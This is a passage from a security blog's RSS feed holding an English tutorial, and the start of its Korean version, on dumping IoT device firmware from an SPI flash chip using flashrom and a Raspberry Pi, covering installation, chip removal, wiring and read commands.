href="https://blockapps.net/blog/staking-in-crypto-exploring-adoption-trends-and-strategies-for-2024/">https://blockapps.net/blog/staking-in-crypto-exploring-adoption-trends-and-strategies-for-2024/</a><br><a href="https://coinbureau.com/review/decred-dcr/">https://coinbureau.com/review/decred-dcr/</a><br><a href="https://pmg.csail.mit.edu/papers/osdi99.pdf">https://pmg.csail.mit.edu/papers/osdi99.pdf</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/bitcoin/">bitcoin</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockchain/">blockchain</category>
      
      <category domain="https://hackyboiz.github.io/tags/PoW/">PoW</category>
      
      <category domain="https://hackyboiz.github.io/tags/ethereum/">ethereum</category>
      
      <category domain="https://hackyboiz.github.io/tags/PoS/">PoS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/09/bekim/consensus_algorithm/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Flash Memory Dump with Flashrom</title>
      <link>https://hackyboiz.github.io/2025/03/09/newp1ayer48/flashrom/en/</link>
      <guid>https://hackyboiz.github.io/2025/03/09/newp1ayer48/flashrom/en/</guid>
      <pubDate>Sun, 09 Mar 2025 03:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! I&amp;#x2019;m &lt;code&gt;newp1ayer48&lt;/code&gt;, and it&amp;#x2019;s a pleasure to introduce myself! &amp;#x1F647;&amp;#x1F3FB;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2025/03/</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! I&#x2019;m <code>newp1ayer48</code>, and it&#x2019;s a pleasure to introduce myself! &#x1F647;&#x1F3FB;</p><p><img src="/2025/03/09/newp1ayer48/flashrom/en/image1.jpeg" alt></p><p>The start of IoT / Embedded hacking and its most crucial part is obtaining the firmware.</p><p>Firmware is essential because, with it, you can understand how the device operates, analyze the vectors where vulnerabilities may arise, and analyze the code.</p><p>There are several ways to obtain firmware, but here are some representative methods:</p><ul><li>Downloading firmware from official websites</li><li>Sniffing firmware update packets</li><li>Dumping firmware through debugging ports (UART, JTAG, etc.)</li><li>Directly connecting to Flash Memory dumping the firmware</li></ul><p>Flash memory is a chip typically used for storage purposes and is commonly found in IoT devices in an 8-pin form.</p><p>Since the firmware is ultimately stored in this Flash Memory chip, directly extracting the firmware from Flash Memory has the advantage of being a more reliable method.</p><p>Using the flashrom program, you can easily extract the firmware from Flash Memory.</p><p>However, this method can potentially damage the equipment and board, so you should proceed with caution. &#x26A0;&#xFE0F;</p><p>Because heat is applied directly to the board using tools like soldering irons or heat guns, there is a risk of damaging the chip or the board, and improper connections may lead to short circuits.</p><p>Due to these risks, you may end up damaging IoT/embedded equipment that was purchased for bug bounty purposes.</p><p>It&#x2019;s somewhat like trying to extract a golden egg by cutting open a goose&#x2019;s belly, only to kill the goose in the process&#x2026; &#x1FAA6;</p><p><img src="/2025/03/09/newp1ayer48/flashrom/en/image2.png" alt></p><p>If you need to extract firmware, it&#x2019;s best to try the other methods mentioned above before opting for a Flash memory dump.</p><p>The flow for performing a Flash memory dump using flashrom is as follows: &#x1F4DD;</p><ol><li>Install flashrom on Raspberry Pi</li><li>Flash Memory Chip Off</li><li>Connect Flash Memory chip to Raspberry Pi</li><li>Flash memory dump</li></ol><p>Here&#x2019;s a list of the required equipment and tools: &#x1F4B8;</p><ul><li>Raspberry Pi (64 Bit)</li><li>IC Test Hook Clip (SDK08)</li><li>Heat Gun</li><li>Jumper cables and breadboard</li></ul><h2 id="1-Installing-flashrom"><a href="#1-Installing-flashrom" class="headerlink" title="1. Installing flashrom"></a>1. Installing flashrom</h2><blockquote><p><a href="https://www.flashrom.org/">https://www.flashrom.org/</a></p></blockquote><p>Flashrom is a development tool that allows you to flash data and images to flash chips.</p><p>It offers functions like detecting, reading, writing, verifying, and erasing, which makes it useful for embedded hacking to extract firmware from flash memory.</p><p>You need to install the necessary dependencies and use meson to install it on Raspberry Pi. &#x1F352;</p><p>Prepare your Raspberry Pi in 64-bit mode for installation.</p><pre><code class="hljs bash">sudo apt-get install -y gcc meson ninja-build pkg-config python3-sphinx libcmocka-dev libpci-dev libusb-1.0-0-dev libftdi1-dev libjaylink-dev libssl-devgit <span class="hljs-built_in">clone</span> https://github.com/flashrom/flashrommeson setup builddirmeson compile -C builddirmeson <span class="hljs-built_in">test</span> -C builddirmeson install -C builddir</code></pre><h2 id="2-Flash-Memory-Chip-Off"><a href="#2-Flash-Memory-Chip-Off" class="headerlink" title="2. Flash Memory Chip Off"></a>2. Flash Memory Chip Off</h2><p>When extracting the chip with flashrom, performing the dump while the chip is still attached to the board may result in unsuccessful extraction. &#x1F47B;</p><p>The reason varies depending on the equipment and board, but usually, the Raspberry Pi provides power to the entire board, which may introduce noise signals that could interfere with the extraction process.</p><p>The following image shows the Raspberry Pi&#x2019;s VCC and GND pins touching the corresponding pins on the Flash Memory chip, confirming that power is supplied to the board.</p><p><img src="/2025/03/09/newp1ayer48/flashrom/en/image3.png" alt></p><p>For this reason, it&#x2019;s better to remove the chip from the board and connect only the chip.</p><p>Use a heat gun to melt the solder and remove the chip from the board.</p><p>Be cautious during this process as the risk of damaging the board is quite high.</p><p><img src="/2025/03/09/newp1ayer48/flashrom/en/image4.png" alt></p><h2 id="3-Connecting-the-Flash-Memory-Chip-to-the-Raspberry-Pi"><a href="#3-Connecting-the-Flash-Memory-Chip-to-the-Raspberry-Pi" class="headerlink" title="3. Connecting the Flash Memory Chip to the Raspberry Pi"></a>3. Connecting the Flash Memory Chip to the Raspberry Pi</h2><p>Typically, Flash memory used in low-power IoT and embedded devices is an 8-pin chip that uses SPI communication.</p><p>While the pin assignments may vary depending on the chip model and vendor, the function of the 8 pins is usually the same, so refer to the datasheet for the pinout.</p><p>The datasheet provides all the information for using and describing the chip, so make sure to consult it!</p><p><img src="/2025/03/09/newp1ayer48/flashrom/en/image5.png" alt></p><p>The roles of each of the 8 pins of Flash Memory are as follows: &#x1F4CC;</p><ul><li><strong>VCC</strong>: Supplies power</li><li><strong>GND</strong>: Ground, provides reference voltage</li><li><strong>SCLK (SCK, CLK)</strong>: Serial Clock, synchronization signal</li><li><strong>CS (SS)</strong>: Chip Select, selects the device and chip<ul><li>This pin is used to select a specific chip from multiple chips on the main MCU.</li></ul></li><li><strong>DI (SI)</strong>: Data Input<ul><li>Used to input data to Flash Memory.</li></ul></li><li><strong>DO (SO)</strong>: Data Output<ul><li>Used to output data from Flash Memory.</li></ul></li><li><strong>WP</strong>: Write Protect<ul><li>When this pin signal is activated, writing to the Flash Memory is disabled.</li></ul></li><li><strong>Hold</strong>: Chip Pause<ul><li>When this pin signal is activated, it pauses the operation of the Flash Memory.</li></ul></li></ul><p>Connect the Raspberry Pi&#x2019;s GPIO pins to the Flash Memory&#x2019;s pins.</p><p>The VCC, Hold, and WP pins on the Flash Memory use the VCC power signal. Since Raspberry Pi&#x2019;s GPIO pins lack enough VCC pins, it&#x2019;s more convenient to supply the VCC signal using a breadboard or similar method.</p><p><img src="/2025/03/09/newp1ayer48/flashrom/en/image6.jpg" alt></p><p>Use the IC Test Hook Clip to connect the pins and begin the extraction process.</p><p>The thinner the clip, the easier the connection, so it&#x2019;s recommended to use a thin test clip.</p><p><img src="/2025/03/09/newp1ayer48/flashrom/en/image7.png" alt></p><h2 id="4-Flash-Memory-Dump"><a href="#4-Flash-Memory-Dump" class="headerlink" title="4. Flash Memory Dump"></a>4. Flash Memory Dump</h2><p>Once everything is connected, execute the following command in the Raspberry Pi terminal to start the extraction process. &#x1F489;</p><pre><code class="hljs bash"><span class="hljs-comment"># Check connection and check chip name</span>sudo flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=2000 -V<span class="hljs-comment"># extraction</span>sudo flashrom -p linux_spi:dev=/dev/spidev0.0 -r [filename]sudo flashrom -p linux_spi:dev=/dev/spidev0.0 -c [Chipname] -r [filename]</code></pre><p><img src="/2025/03/09/newp1ayer48/flashrom/en/image8.png" alt></p><p>If the chip is supported, flashrom will begin the extraction process immediately.</p><p>However, if the chip is not supported, you can check <code>flashchips.h</code> and <code>flashchips.c</code>. If the chip is not listed, you can add the chip manually and then build it for extraction.</p><p>Refer to the datasheet to add the chip information to the flashchips.c file.</p><pre><code class="hljs c"><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flashchip</span> <span class="hljs-title">flashchips</span>[] = {</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * .vendor= Vendor name</span><span class="hljs-comment"> * .name= Chip name</span><span class="hljs-comment"> * .bustype= Supported flash bus types (Parallel, LPC...)</span><span class="hljs-comment"> * .manufacture_id= Manufacturer chip ID</span><span class="hljs-comment"> * .model_id= Model chip ID</span><span class="hljs-comment"> * .total_size= Total size in (binary) kbytes</span><span class="hljs-comment"> * .page_size= Page or eraseblock(?) size in bytes</span><span class="hljs-comment"> * .tested= Test status</span><span class="hljs-comment"> * .probe= Probe function</span><span class="hljs-comment"> * .probe_timing= Probe function delay</span><span class="hljs-comment"> * .block_erasers[]= Array of erase layouts and erase functions</span><span class="hljs-comment"> * {</span><span class="hljs-comment"> *.eraseblocks[]= Array of { blocksize, blockcount }</span><span class="hljs-comment"> *.block_erase= Block erase function</span><span class="hljs-comment"> * }</span><span class="hljs-comment"> * .printlock= Chip lock status function</span><span class="hljs-comment"> * .unlock= Chip unlock function</span><span class="hljs-comment"> * .write= Chip write function</span><span class="hljs-comment"> * .read= Chip read function</span><span class="hljs-comment"> * .voltage= Voltage range in millivolt</span><span class="hljs-comment"> */</span></code></pre><p>With this process, you can successfully dump the firmware stored in the chip!</p><p>After removing the Flash Memory chip, the device won&#x2019;t work until it&#x2019;s reassembled&#x2026;</p><p>But! Reassembly is simply the reverse of disassembly!</p><p>Once the Flash Memory chip is properly (!) re-soldered, the device will be usable again!</p><p>By extracting the firmware and restoring the device, you can have the best of both worlds! &#x1F925;</p><p><img src="/2025/03/09/newp1ayer48/flashrom/en/image9.png" alt></p><p>Next, we will cover the commonly attempted UART/JTAG debugging port connections in embedded hacking!Thank you! &#x1F64F;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/firmware/">firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/IoT/">IoT</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/09/newp1ayer48/flashrom/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Flashrom으로 Flash Memory Dump하기</title>
      <link>https://hackyboiz.github.io/2025/03/09/newp1ayer48/flashrom/ko/</link>
      <guid>https://hackyboiz.github.io/2025/03/09/newp1ayer48/flashrom/ko/</guid>
      <pubDate>Sun, 09 Mar 2025 03:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! &amp;#xC774;&amp;#xBC88;&amp;#xC5D0; &amp;#xC0C8;&amp;#xB85C; &amp;#xC778;&amp;#xC0AC; &amp;#xB4DC;&amp;#xB9AC;&amp;#xAC8C; &amp;#xB41C; &lt;c</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xC774;&#xBC88;&#xC5D0; &#xC0C8;&#xB85C; &#xC778;&#xC0AC; &#xB4DC;&#xB9AC;&#xAC8C; &#xB41C; <code>newp1ayer48</code> &#xC785;&#xB2C8;&#xB2E4;! &#x1F647;&#x1F3FB;</p><p><img src="/2025/03/09/newp1ayer48/flashrom/ko/image1.jpeg" alt></p><p>IoT / &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9;&#xC758; &#xC2DC;&#xC791;&#xC774;&#xC790;, &#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD55C; &#xBD80;&#xBD84;&#xC740; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xD68D;&#xB4DD;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD38C;&#xC6E8;&#xC5B4;&#xAC00; &#xC788;&#xC5B4;&#xC57C; &#xC7A5;&#xBE44;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xC774;&#xD574;&#xD558;&#xACE0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBCA1;&#xD130;&#xC640; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xD68D;&#xB4DD;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xC5EC;&#xB7EC;&#xAC00;&#xC9C0;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xB9CC; &#xB300;&#xD45C;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xB4E4;&#xC744; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xC815;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xACF5;&#xC2DD; &#xD648;&#xD398;&#xC774;&#xC9C0; &#xB4F1;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xB418;&#xB294; &#xD38C;&#xC6E8;&#xC5B4; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;</li><li>&#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0B7; &#xC2A4;&#xB2C8;&#xD551;</li><li>&#xB514;&#xBC84;&#xAE45; &#xD3EC;&#xD2B8;(UART, JTAG &#xB4F1;) &#xC5F0;&#xACB0;&#xC744; &#xD1B5;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4; &#xB364;&#xD504;</li><li>Flash Memory&#xC5D0; &#xC9C1;&#xC811; &#xC5F0;&#xACB0;&#xD558;&#xC5EC; &#xD38C;&#xC6E8;&#xC5B4; &#xB364;&#xD504;</li></ul><p>Flash memory&#xB294; &#xC800;&#xC7A5; &#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; Chip&#xC73C;&#xB85C; IoT &#xAE30;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xBCF4;&#xD1B5; 8 pin &#xD615;&#xD0DC;&#xB85C; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD38C;&#xC6E8;&#xC5B4;&#xB294; &#xACB0;&#xAD6D; &#xC774; Flash Memory&#xB77C;&#xB294; Chip&#xC5D0; &#xB4E4;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, Flash Memory&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xD655;&#xC2E4;&#xD558;&#xB2E4;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; flashrom &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xC190;&#xC27D;&#xAC8C; Flash Memory &#xB0B4;&#xBD80;&#xC758; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xCD94;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC774; &#xBC29;&#xBC95;&#xC740; &#xC7A5;&#xBE44;&#xC640; &#xBCF4;&#xB4DC;&#xC5D0; &#xC190;&#xC0C1;&#xC744; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774;&#xAE30;&#xC5D0; &#xC8FC;&#xC758;&#xD558;&#xC5EC; &#xC2DC;&#xB3C4;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#x26A0;&#xFE0F;</p><p>&#xC778;&#xB450;&#xAE30;&#xB098; &#xC5F4;&#xD48D;&#xAE30; &#xB4F1;&#xC73C;&#xB85C; &#xBCF4;&#xB4DC;&#xC5D0; &#xC9C1;&#xC811; &#xC5F4;&#xC744; &#xAC00;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCE69;&#xC774;&#xB098; &#xBCF4;&#xB4DC;&#xAC00; &#xD0C8; &#xC218;&#xB3C4; &#xC788;&#xACE0;, &#xC798;&#xBABB;&#xB41C; &#xC5F0;&#xACB0;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xBA74; &#xD569;&#xC120;&#xC758; &#xC704;&#xD5D8;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; &#xBB38;&#xC81C;&#xB85C; &#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xC704;&#xD574; &#xAD6C;&#xC785;&#xD55C; IoT/ &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC7A5;&#xBE44;&#xB97C; &#xB9DD;&#xAC00;&#xB728;&#xB9B4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9C8;&#xCE58; &#xD669;&#xAE08;&#xC54C;&#xC744; &#xAEBC;&#xB0B4;&#xAE30; &#xC704;&#xD574; &#xAC70;&#xC704; &#xBC30;&#xB97C; &#xAC08;&#xB790;&#xB2E4;&#xAC00;, &#xB3C4;&#xB9AC;&#xC5B4; &#xAC70;&#xC704;&#xB9CC; &#xC8FD;&#xAC8C; &#xB418;&#xC5B4;&#xBC84;&#xB9AC;&#xB294; &#xC77C;&#xACFC; &#xBE44;&#xC2B7;&#xD569;&#xB2C8;&#xB2E4;&#x2026; &#x1FAA6;</p><p><img src="/2025/03/09/newp1ayer48/flashrom/ko/image2.png" alt></p><p>&#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xCD94;&#xCD9C;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xBA74;, &#xC704;&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD574;&#xB4DC;&#xB9B0; &#xB2E4;&#xB978; &#xBC29;&#xBC95;&#xB4E4;&#xC740; &#xBA3C;&#xC800; &#xC2DC;&#xB3C4;&#xD574;&#xBCF4;&#xACE0; Flash memory dump&#xB97C; &#xD558;&#xB294; &#xAC83;&#xC774; &#xBC14;&#xB78C;&#xC9C1;&#xD569;&#xB2C8;&#xB2E4;.</p><p>flashrom&#xC744; &#xC774;&#xC6A9;&#xD55C; Flash memory dump&#xC758; &#xD750;&#xB984;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F4DD;</p><ol><li>Raspberry Pi&#xC5D0; flashrom &#xC124;&#xCE58;</li><li>Flash Memory Chip Off</li><li>Flash memory chip&#xACFC; Raspberry Pi &#xC5F0;&#xACB0;</li><li>Flash memory dump</li></ol><p>&#xD544;&#xC694;&#xD55C; &#xC7A5;&#xBE44;&#xC640; &#xB3C4;&#xAD6C;&#xC758; &#xBAA9;&#xB85D;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F4B8;</p><ul><li>Raspberry Pi (64 Bit)</li><li>IC Test Hook Clip (SDK08)</li><li>Heat Gun (&#xC5F4;&#xD48D;&#xAE30;)</li><li>&#xC810;&#xD37C; &#xCF00;&#xC774;&#xBE14; &#xBC0F; &#xBE0C;&#xB808;&#xB4DC;&#xBCF4;&#xB4DC;</li></ul><h2 id="1-flashrom-&#xC124;&#xCE58;"><a href="#1-flashrom-&#xC124;&#xCE58;" class="headerlink" title="1. flashrom &#xC124;&#xCE58;"></a>1. flashrom &#xC124;&#xCE58;</h2><blockquote><p><a href="https://www.flashrom.org/">https://www.flashrom.org/</a></p></blockquote><p>Flashrom&#xC740; flash chip&#xC5D0; &#xB370;&#xC774;&#xD130;&#xC640; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD50C;&#xB798;&#xC2DC;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC1C;&#xBC1C; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>detecting, reading, writing, verifying, erasing&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;,</p><p>&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xB3C4;&#xAD6C;&#xB97C; &#xD1B5;&#xD574; flash memory &#xC548;&#xC5D0; &#xC788;&#xB294; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC5ED;&#xC73C;&#xB85C; &#xCD94;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAD00;&#xB828; Dependency&#xB97C; &#xC124;&#xCE58;&#xD558;&#xACE0;, meson&#xC73C;&#xB85C; Raspberry Pi&#xC5D0;&#xC11C; &#xC124;&#xCE58;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#x1F352;</p><p>Raspberry Pi&#xB294; 64 Bit&#xB85C; &#xC124;&#xCE58;&#xD558;&#xC5EC; &#xC900;&#xBE44;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">sudo apt-get install -y gcc meson ninja-build pkg-config python3-sphinx libcmocka-dev libpci-dev libusb-1.0-0-dev libftdi1-dev libjaylink-dev libssl-devgit <span class="hljs-built_in">clone</span> https://github.com/flashrom/flashrommeson setup builddirmeson compile -C builddirmeson <span class="hljs-built_in">test</span> -C builddirmeson install -C builddir</code></pre><h2 id="2-Flash-Memory-Chip-Off"><a href="#2-Flash-Memory-Chip-Off" class="headerlink" title="2. Flash Memory Chip Off"></a>2. Flash Memory Chip Off</h2><p>flashrom&#xC73C;&#xB85C; Chip&#xC744; &#xCD94;&#xCD9C;&#xD560; &#xB54C;, Chip&#xC774; &#xBCF4;&#xB4DC;&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xC0C1;&#xD0DC;&#xB85C; Dump&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74;, &#xCD94;&#xCD9C;&#xC774; &#xC6D0;&#xD65C;&#xD558;&#xAC8C; &#xB418;&#xC9C0; &#xC54A;&#xC744; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F47B;</p><p>&#xC774;&#xC720;&#xB294; &#xC7A5;&#xBE44;&#xC640; &#xBCF4;&#xB4DC;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB974;&#xACA0;&#xC9C0;&#xB9CC;, Raspberry Pi&#xAC00; Chip&#xC73C;&#xB85C; &#xACF5;&#xAE09; &#xB418;&#xC5B4;&#xC57C; &#xD560; &#xC804;&#xC6D0;&#xC774; &#xBCF4;&#xB4DC; &#xC804;&#xCCB4;&#xB85C; &#xACF5;&#xAE09;&#xB418;&#xC5B4; &#xBCF4;&#xB4DC;&#xC5D0; &#xB178;&#xC774;&#xC988; &#xC2E0;&#xD638;&#xAC00; &#xCD94;&#xCD9C;&#xC744; &#xBC29;&#xD574;&#xD558;&#xAC70;&#xB098; &#xBB38;&#xC81C;&#xAC00; &#xB420; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; Raspberry Pi&#xC758; VCC, GND &#xD540;&#xC744; Flash Memory Chip&#xC5D0; &#xD574;&#xB2F9; &#xD540;&#xC744; &#xC811;&#xCD09;&#xD558;&#xB294; &#xAC83; &#xB9CC;&#xC73C;&#xB85C; &#xBCF4;&#xB4DC;&#xC5D0; &#xC804;&#xC6D0;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0AC;&#xC9C4;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/09/newp1ayer48/flashrom/ko/image3.png" alt></p><p>&#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBCF4;&#xB4DC;&#xC5D0;&#xC11C; Chip Off&#xB97C; &#xD558;&#xC5EC; Chip&#xB9CC;&#xC744; &#xC5F0;&#xACB0;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5F4;&#xD48D;&#xAE30;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xB55C;&#xB0A9;&#xC744; &#xB179;&#xC774;&#xACE0; Chip Off&#xB97C; &#xC2E4;&#xC2DC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBCF4;&#xB4DC;&#xAC00; &#xB9DD;&#xAC00;&#xC9C8; &#xC704;&#xD5D8;&#xC774; &#xB9E4;&#xC6B0; &#xB192;&#xAE30;&#xC5D0;, &#xC8FC;&#xC758;&#xD574;&#xC11C; Chip Off&#xB97C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/09/newp1ayer48/flashrom/ko/image4.png" alt></p><h2 id="3-Flash-memory-chip&#xACFC;-Raspberry-Pi-&#xC5F0;&#xACB0;"><a href="#3-Flash-memory-chip&#xACFC;-Raspberry-Pi-&#xC5F0;&#xACB0;" class="headerlink" title="3. Flash memory chip&#xACFC; Raspberry Pi &#xC5F0;&#xACB0;"></a>3. Flash memory chip&#xACFC; Raspberry Pi &#xC5F0;&#xACB0;</h2><p>&#xBCF4;&#xD1B5; &#xC800;&#xC804;&#xB825; IoT &#xBC0F; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC7A5;&#xBE44;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; Flash memory&#xB294; SPI &#xD1B5;&#xC2E0;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; 8 pin chip&#xC778; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>chip &#xBAA8;&#xB378;&#xACFC; vendor&#xB9C8;&#xB2E4; &#xAC01; pin&#xC758; &#xC138;&#xBD80; &#xC5ED;&#xD560;&#xC5D0; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xC744; &#xC218;&#xB294; &#xC788;&#xC9C0;&#xB9CC;, &#xB300;&#xBD80;&#xBD84; 8 pin&#xC758; &#xC5ED;&#xD560;&#xC740; &#xAC19;&#xC73C;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xCE69;&#xC758; Datasheet&#xB97C; &#xD655;&#xBCF4;&#xD558;&#xC5EC; Pin out&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Datasheet&#xC5D0;&#xB294; &#xC81C;&#xC870;&#xC0AC;&#xAC00; &#xD574;&#xB2F9; Chip&#xC758; &#xC124;&#xBA85;&#xACFC; &#xC0AC;&#xC6A9;&#xC744; &#xC704;&#xD55C; &#xBAA8;&#xB4E0; &#xC815;&#xBCF4;&#xB97C; &#xC801;&#xC5B4; &#xB1A8;&#xC73C;&#xB2C8; &#xAF2D; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/03/09/newp1ayer48/flashrom/ko/image5.png" alt></p><p>Flash Memory&#xC758; &#xAC01; 8 pin&#xC758; &#xC5ED;&#xD560;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F4CC;</p><ul><li>VCC: &#xC804;&#xC6D0;&#xC744; &#xACF5;&#xAE09;</li><li>GND: &#xC811;&#xC9C0;, &#xAE30;&#xC900; &#xC804;&#xC555;&#xC744; &#xACF5;&#xAE09;</li><li>Sclk(SCK, CLK): &#xC9C1;&#xB82C; &#xD074;&#xB7ED;, &#xB3D9;&#xAE30;&#xD654; &#xC2E0;&#xD638;</li><li>CS(SS): Chip Select, &#xC7A5;&#xCE58; &#xBC0F; Chip &#xC120;&#xD0DD;<ul><li>&#xBA54;&#xC778; MCU&#xC5D0;&#xC11C; &#xC5EC;&#xB7EC; Chip &#xC911; &#xD2B9;&#xC815; Chip&#xC744; &#xC120;&#xD0DD;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; pin</li></ul></li><li>DI(SI): Data Input<ul><li>Flash Memory&#xB85C; &#xB370;&#xC774;&#xD130; &#xC785;&#xB825;</li></ul></li><li>DO(SO): Data Output<ul><li>Flash Memory&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130; &#xCD9C;&#xB825;</li></ul></li><li>WP: Write 